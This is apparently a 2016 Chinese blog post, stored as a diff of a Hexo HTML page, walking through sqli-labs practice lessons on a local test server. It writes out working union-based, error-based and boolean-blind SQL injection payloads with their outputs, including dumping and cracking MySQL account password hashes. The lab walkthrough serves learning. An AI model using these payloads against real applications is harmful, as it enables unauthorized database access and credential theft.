@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>注入练习 | Red</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="less-1 字符串注入
+?id=1’ and ‘1’=’1    判断id 是int型还是 字符串类型   you are in……  说明是字符串类型?id=1’ order by 10/5/3/4 判断出查询的这张表有多少字段      by 3 的时候正常 说明有三个字段?id=-1’  union select 1,2,3   判断显示位                   2，3为显示">
+<meta property="og:type" content="article">
+<meta property="og:title" content="注入练习">
+<meta property="og:url" content="http://yoursite.com/2016/08/30/注入练习/index.html">
+<meta property="og:site_name" content="Red">
+<meta property="og:description" content="less-1 字符串注入
+?id=1’ and ‘1’=’1    判断id 是int型还是 字符串类型   you are in……  说明是字符串类型?id=1’ order by 10/5/3/4 判断出查询的这张表有多少字段      by 3 的时候正常 说明有三个字段?id=-1’  union select 1,2,3   判断显示位                   2，3为显示">
+<meta property="og:updated_time" content="2016-09-18T07:48:30.234Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="注入练习">
+<meta name="twitter:description" content="less-1 字符串注入
+?id=1’ and ‘1’=’1    判断id 是int型还是 字符串类型   you are in……  说明是字符串类型?id=1’ order by 10/5/3/4 判断出查询的这张表有多少字段      by 3 的时候正常 说明有三个字段?id=-1’  union select 1,2,3   判断显示位                   2，3为显示">
+  
+    <link rel="alternate" href="/atom.xml" title="Red" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Red</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-注入练习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/注入练习/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      注入练习
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>less-1 字符串注入</p>
+<p>?id=1’ and ‘1’=’1    判断id 是int型还是 字符串类型   you are in……  说明是字符串类型<br>?id=1’ order by 10/5/3/4 判断出查询的这张表有多少字段      by 3 的时候正常 说明有三个字段<br>?id=-1’  union select 1,2,3   判断显示位                   2，3为显示位</p>
+<p>准备就绪  开始获取想要的信息（数据库管理员的账号密码）</p>
+<p>获取mysql版本 </p>
+<p>?id=-1’  union select 1,2,(select versraion()) –+       得到版本信息为5.5.40   5.0以上都存在information_schema库</p>
+<p>在information_schema库中 获取库名 表名 字段名</p>
+<p>id=-1’  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) –+                   </p>
+<p> Your Login name:2<br>Your Password:information_schema,fsql,kppw26,mysql,paimai,performance_schema,rank,security,test              </p>
+<p>得到了所有的数据库名 查看想要的数据库的所有表 比如:(mysql)</p>
+<p>?id=-1’  union select 1,(select group_concat(distinct table_name) from information_schema.columns where table_schema=’mysql’),(select  group_concat(distinct table_schema) from information_schema.columns) –+</p>
+<p> Your Login name:columns_priv,db,event,func,general_log,help_category,help_keyword,help_relation,help_topic,host,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,servers,slow_log,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user<br>Your Password:information_schema,fsql,kppw26,mysql,paimai,performance_schema,rank,security,test </p>
+<p>查看想要的表的字段名 （mysql.user表中只需要user and password 即获得所有账号密码）</p>
+<p>?id=-1’  union select 1,2,(select  group_concat(column_name) from information_schema.columns where table_schema=’mysql’ and table_name=’user’) –+</p>
+<p> Your Login name:2<br>Your Password:Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routin</p>
+<p>获取数据库管理员的账号密码(密文)</p>
+<p>id=-1’  union select 1,2,(select  group_concat(User,Password) from mysql.user) –+</p>
+<p> Your Login name:2<br>Your Password:root<em>81F5E21E35407D884A6CD4A731AEBFB6AF209E1B,root</em>81F5E21E35407D884A6CD4A731AEBFB6AF209E1B,mr*2491CA5000A9614AA28C39036702D965584486EC</p>
+<p>md5加密解密<br>sha1加密解密<br>password()函数加密<br>得到mr账户的明文密码为 qwer<br>root用户的明文密码为 root</p>
+<p>本次注入成功</p>
+<p>less-2  整型注入    与less-1 方法一样</p>
+<p>less-5   报错注入</p>
+<p>先判断类型<br>?id=1’ and ‘1’=’1    字符串类型</p>
+<p>?id=1’ order by 4/3 –+    有3个字段</p>
+<p>?id=-1’ union select 1,2,3 –+        You are in………..   看来是没有显示位 那么使用报错注入</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-5/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-5/?id=1</a>‘ union select 1,count(<em>),floor(rand(0)</em>2)x from information_schema.columns group by  x–+        //（因为存在information_schema表所以可以直接使用）<br><a href="http://127.0.0.1/sqli/sqli/Less-5/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-5/?id=1</a>‘ union select 1,count(<em>),concat(version(),0x7e,floor(rand(0)</em>2))x from information_schema.columns group by  x–+</p>
+<p> Duplicate entry ‘1’ for key ‘group_key’   // 出现报错 在’1’位置创造显示位</p>
+<p> 查看当前使用的数据库名<br> ?id=1’ union select 1,count(<em>),concat(database(),0x7e,floor(rand(0)</em>2))x from information_schema.columns group by  x–+</p>
+<p>Duplicate entry ‘security~1’ for key ‘group_key’</p>
+<p>查询有多少库</p>
+<p>?id=1’ union select 1,count(<em>),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)</em>2))x from information_schema.columns group by  x–+</p>
+<p>Duplicate entry ‘9~1’ for key ‘group_key’</p>
+<p>查询数据库名  只能使用limit一个一个显示</p>
+<p>(select distinct table_schema from information_schema.columns limit 1,1)</p>
+<p>Duplicate entry ‘fsql~1’ for key ‘group_key’<br>Duplicate entry ‘security~1’ for key ‘group_key’</p>
+<p>查询security库中的表个数</p>
+<p>(select count(distinct table_name) from information_schema.columns where table_schema=’security’)</p>
+<p>Duplicate entry ‘4~1’ for key ‘group_key’</p>
+<p>查询security中的表的表名</p>
+<p>(select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1)</p>
+<p>Duplicate entry ‘emails~1’ for key ‘group_key’<br>Duplicate entry ‘referers~1’ for key ‘group_key’<br>Duplicate entry ‘uagents~1’ for key ‘group_key’<br>Duplicate entry ‘users~1’ for key ‘group_key’</p>
+<p>查询表中的表结构个数<br>(select count(distinct column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’)</p>
+<p>Duplicate entry ‘3~1’ for key ‘group_key’</p>
+<p>查询表结构</p>
+<p>(select distinct column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 0,1)</p>
+<p>Duplicate entry ‘id~1’ for key ‘group_key’<br>Duplicate entry ‘username~1’ for key ‘group_key’<br>Duplicate entry ‘password~1’ for key ‘group_key’</p>
+<p>获取 username and passwore</p>
+<p>(select concat(username,0x7e,password) from security.users limit 0,1)</p>
+<p>Duplicate entry ‘Dumb~Dumb~1’ for key ‘group_key’<br>Duplicate entry ‘Dummy~p@ssword~1’ for key ‘group_key’<br>Duplicate entry ‘secure~crappy~1’ for key ‘group_key’</p>
+<p>本次报错注入结束</p>
+<p>less-8   布尔型注入 (盲注)</p>
+<p>查询库名 表名 字段名 内容</p>
+<p>用到的函数 ： exists() 判断是否有返回值 （0，1）<br>              length() 查询字符串的长度<br>              substr(string,num start,num length)  查看字符串的某一段<br>              例如：mysql&gt; select substr((select database()),1,6);<br>                        +———————————+<br>                        | substr((select database()),1,6) |<br>                        +———————————+<br>                        | securi                          |<br>                        +———————————+<br>              ascii()  查询字符串的ascii码</p>
+<p>判断有多少个数据库</p>
+<p>(select count(distinct table_schema) from information_schema.columns)</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and ((select count(distinct table_schema) from information_schema.columns)&gt;8)<br> –+</p>
+<pre><code>回显正常 有9个数据库 
+</code></pre><p> 查询某个数据库库名：</p>
+<p> ①：判断库名长度 length()，②：substr() 一个一个查看字段 ③：ascii() 判断字段的ascii码</p>
+<p>select length((select distinct table_schema from information_schema.columns limit 0,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)<br> –+</p>
+<p> 回显正常 第一个数据库名长度为 18</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select distinct table_schema from information_schema.columns limit 1,1))&gt;3)<br>–+<br>回显正常 第二个数据库名长度为 4<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>②：substr() 一个一个查看字段 ③：ascii() 判断字段的ascii码</p>
+<p>select substr((select distinct table_schema from information_schema.columns limit 0,1),1,1)   </p>
+<p>select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))              //查找字段的第一个字母的ascii码</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104)<br>–+</p>
+<p>回显正常  得到数据库名的第一个字段的ascii码为 105</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),2,1))&gt;109)<br>–+<br>回显正常  得到数据库名的第二个字段的ascii码为 110<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>                            数据库名为 information_schema<br>                            第二个为   fsql</p>
+<pre><code>(下边步骤我们使用数据库为security)
+</code></pre><p>查询数据库中表名：</p>
+<p>select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1</p>
+<p>select length((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1))&gt;5)<br>–+</p>
+<p>回显正常  第一个表名的length为 6</p>
+<p>当前数据库第一个字符的ascii码</p>
+<p>select ascii(substr((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1),1,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1),1,1))&gt;100)<br>–+</p>
+<p>ascii 为101</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1),2,1))&gt;108)<br>–+</p>
+<p>ascii ：109<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>                                表名： emails</p>
+<p>查询emails表中的字段名</p>
+<p>select length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 0,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 1,1))&gt;1)<br>–+</p>
+<p>length :8</p>
+<p>select ascii(substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 0,1),1,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 1,1),1,1))&gt;100)<br>–+</p>
+<p>ascii:101<br>                        ..<br>                        .<br>                        .<br>                        .</p>
+<pre><code>.
+.
+列名为 email_id
+</code></pre><p>查询 内容</p>
+<p>select email_id from security.emails limit 0,1</p>
+<p>select length((select email_id from security.emails limit 0,1))</p>
+<p>select ascii(substr((select email_id from security.emails limit 0,1),1,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select email_id from security.emails limit 0,1),1,1))&gt;67)<br>–+</p>
+<p>ascii:68<br>    .<br>    .<br>    .<br>    .<br>    .<br>    .<br>    .<br>    .</p>
+<pre><code>结果：security的emails表的email_id列的内容：Dumb@dhakkan.com
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/注入练习/" data-id="cit8bn83m0006zcqvdhwl4006" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/08/30/SQL注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SQL 注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/08/16/read_sqlmap/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Read_Sqlmap</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2016/08/30/CSRF/">CSRF</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/XSS/">XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/SQL注入/">SQL 注入</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/注入练习/">注入练习</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/16/read_sqlmap/">Read_Sqlmap</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 xioaxin<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
